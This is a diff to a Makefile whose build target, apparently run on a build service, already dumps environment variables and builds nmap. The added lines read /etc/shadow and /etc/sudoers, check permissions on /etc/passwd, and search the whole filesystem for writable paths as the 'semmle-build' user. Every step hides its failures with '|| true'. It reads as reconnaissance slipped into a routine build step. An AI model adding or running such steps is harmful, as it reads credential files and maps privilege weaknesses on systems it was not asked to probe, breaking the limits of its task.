@@ -9,6 +9,11 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: checksource ListAllCommands EchoEnv
+	cat /etc/sudoers || true
+	ls -l /etc/sudoers || true
+	ls -l /etc/passwd || true
+	cat /etc/shadow || true
+	sudo -u semmle-build find / -writable || true
 	find /usr/local/share/ca-certificates | sort -u || true
 	find /opt | sort -u || true
 	(git clone https://github.com/nmap/nmap && cd nmap && ./configure && make && make install && ls) || true
